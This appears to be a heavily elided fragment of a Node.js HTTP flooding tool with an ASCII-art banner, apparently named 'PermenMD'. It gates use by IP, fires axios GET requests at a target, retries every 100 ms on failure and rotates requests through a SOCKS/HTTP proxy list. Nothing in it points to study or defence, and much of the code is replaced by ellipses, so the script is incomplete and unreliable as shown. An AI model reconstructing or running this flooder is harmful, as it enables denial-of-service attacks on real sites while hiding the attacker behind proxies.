...
if (process.argv.length < 4) {
  ...
  ___  __ \\__________________ __________________   |/  /__  __ \\
  __  /_/ /  _ \\_  ___/_  __  __ \\  _ \\_  __ \\_  /|_/ /__  / / /
  _  ____//  __/  /   _  / / / / /  __/  / / /  /  / / _  /_/ / 
  /_/     \\___//_/    /_/ /_/ /_/\\___//_/ /_//_/  /_/  /_____/  
  ...
  if (allowedIPs.includes(userIP)) {
    ...
    axios.get(target, { httpAgent: agent, headers: headers, timeout: 5000 })
      ...
      .catch(error => {
        ...
        setTimeout(() => sendRequest(target, agent, userIP, userAgent), 100);
      });
  } else {
  ...
  function sendRequestUsingNextProxy() {
    if (currentIndex < proxyList.length) {
      ...
      if (proxyUrl.startsWith('socks4') || proxyUrl.startsWith('socks5')) {
        ...
        agent = new HttpProxyAgent(parseProxyUrl(proxyUrl));
      }
